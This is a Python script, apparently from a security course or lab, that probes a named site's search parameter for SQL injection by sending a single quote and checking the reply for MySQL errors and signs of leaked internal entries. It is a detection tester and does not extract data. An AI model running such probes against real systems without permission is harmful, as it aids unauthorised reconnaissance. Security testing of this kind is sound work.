# ============================================================
#  VULNERABILITY: SQL Injection (SQLi)
#  Target: search.0x10.cloud
#  Author: [Kalid Ali]
# ============================================================

#  SQL Injection occurs when user input is inserted directly
# #  into a database query without proper validation or sanitization.
# #  This allows attackers to:
# #  - Break the structure of SQL queries
# #  - Trigger database error messages
# #  - Modify query logic (e.g., return all records)
# #  - Access internal application data
# #
# #  In this case, the search feature on search.0x10.cloud is
# #  vulnerable. A crafted input causes:
# #  - SQL error messages (e.g., MySQL syntax errors)
# #  - Database information disclosure (version/schema)
# #  - Query manipulation (returns all records)
# #  - Exposure of internal application data (titles only)
# #
# #  NOTE:
# #  The exposed data (e.g., "Database Credentials", "SSH Key Management")
# #  are titles, not actual secrets. However, this still proves that
# #  restricted/internal data is being returned, confirming the vulnerability.
# #
# #  Technique:
# #  Send a chosen payload (') through the search parameter,
# #  then analyze the HTTP response for:
# #  - General SQLi indicators (errors, DB info)
# #  - Application-specific indicators (0x10.cloud) ============================================================

import urllib.request
import urllib.parse
import time

print("=" * 50)
print("  SQL Injection Tester")
print("=" * 50)

# --- Configuration ---
# Target search endpoint
target = "http://search.0x10.cloud/search"

# Test input used to break SQL query structure
test_character = "'"

print(f"\n  [1] Testing {target} for SQL Injection...")

try:
    # server allows ~10 requests per second
    time.sleep(0.15)

    # Encode input into URL-safe format (e.g., ' → %27)
    # This ensures the payload is properly sent in the HTTP request
    query_data = urllib.parse.urlencode({'q': test_character})
    full_url = f"{target}?{query_data}"

    # Send request and retrieve HTML response from server
    response = urllib.request.urlopen(full_url, timeout=5)
    html_code = response.read().decode('utf-8')

    # --- Analyze response for SQL Injection indicators ---
    found = False

    # SQL errors suggest that user input broke the query
    if "SQL syntax" in html_code or "MySQL" in html_code:
        print("      [-] SQL error message detected in response.")
        print("      [-] Indicates that input is not properly sanitized.")
        found = True

    # Database information disclosure (e.g., version, schema)
    if "MySQL" in html_code:
        print("      [-] Database details exposed (version and schema).")
        found = True

    # --- Application-specific indicators (0x10.cloud) ---
    # Indicates that the query logic was altered by the input
    if "All Records Returned" in html_code:
        print("      [-] Query manipulation successful: all records returned.")
        found = True

    # Internal entries visible in results
    if "Database Credentials" in html_code or "SSH Key" in html_code:
        print("      [-] Internal system entries visible (titles only).")
        found = True

    # --- Final result ---
    if found:
        print("\n  [!] VULNERABILITY FOUND")
        print("      [-] The search parameter is vulnerable to SQL Injection.")
        print("      [-] Input can alter query behavior and expose internal data.")
    else:
        print("\n  [OK] No SQL Injection indicators detected.")

except Exception as e:
    # A server error (HTTP 500) may indicate the query failed internally
    if "500" in str(e):
        print("\n  [!] VULNERABILITY LIKELY")
        print("      [-] Server returned HTTP 500 (possible SQL error).")
    else:
        print(f"\n  [ERROR] Request failed: {e}")

print("\n" + "=" * 50)